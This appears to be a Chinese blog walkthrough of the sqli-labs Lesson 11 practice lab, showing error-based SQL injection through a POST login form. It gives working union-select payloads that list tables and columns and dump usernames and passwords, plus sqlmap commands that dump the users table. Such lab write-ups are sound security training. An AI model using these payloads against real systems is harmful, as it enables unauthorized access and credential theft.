---
title: sqli-labs lession-11 基于错误的POST单引号字符型注入
date: 2018-09-27 09:13:12
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-11 基于错误的POST单引号字符型注入 #

---

## 登录界面 ##

![1](/img/sql/Lesson-11/1.png)

## 手注 ##

### POST ###

这是一个POST请求,可以输入信息查看一下。

分别输入admimn和aad

![2](/img/sql/Lesson-11/2.png)

POST拿到了我的输入:

![3](/img/sql/Lesson-11/3.png)

hackbar插件勾选Post.自动填充了POST参数。

![4](/img/sql/Lesson-11/4.png)

### 判断类型 ###

那个hackbar在这里不好用,心疼。

![5](/img/sql/Lesson-11/5.png)

返回报错信息,看来单引号是有效果的,添加#注释。

![6](/img/sql/Lesson-11/6.png)

执行成功。接下来的步骤和Lesson-1差不多了。

### 字段数 ###

![7](/img/sql/Lesson-11/7.png)

![8](/img/sql/Lesson-11/8.png)

![9](/img/sql/Lesson-11/9.png)

确定字段数为2。

### 数据库信息 ###

`adminn' union select database(),@@datadir#`

![10](/img/sql/Lesson-11/10.png)

### 获取表 ###

`adminn' union select database(),(select group_concat(table_name,"--") from information_schema.tables where table_schema = database())#`

![11](/img/sql/Lesson-11/11.png)

获取到了表名:emails,referers,uagents,users

### 获取字段 ###

`adminn' union select database(),(select group_concat(column_name,"--") from information_schema.columns where table_name ='users')#`

![12](/img/sql/Lesson-11/12.png)

获取到了字段:id,username,password

### 获取值 ###

`adminn' union select 1,group_concat(username,":",password,"\n") from users#`

![13](/img/sql/Lesson-11/13.png)

## SQLMAP ##

firefox浏览器设置代理

![14](/img/sql/Lesson-11/14.png)

用Burpsuite抓包,确认接口开启

![15](/img/sql/Lesson-11/15.png)

输入任意字符后点击submit,我这里用的都是xxx

![16](/img/sql/Lesson-11/16.png)

Burpsuite抓到包含POST请求的包

![17](/img/sql/Lesson-11/17.png)

按图保存文件

![18](/img/sql/Lesson-11/18.png)

`sqlmap -r sqlpost/post11.txt -p uname --dbs --technique ES --threads 10`

--threads 选择线程数

-p 指定注入的POST参数

--technique ES

E:Error-based   （报错型注入）

S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）

![19](/img/sql/Lesson-11/19.png)

`sqlmap -r sqlpost/post11.txt -p uname -D security -T users --columns --dump`

![20](/img/sql/Lesson-11/20.png)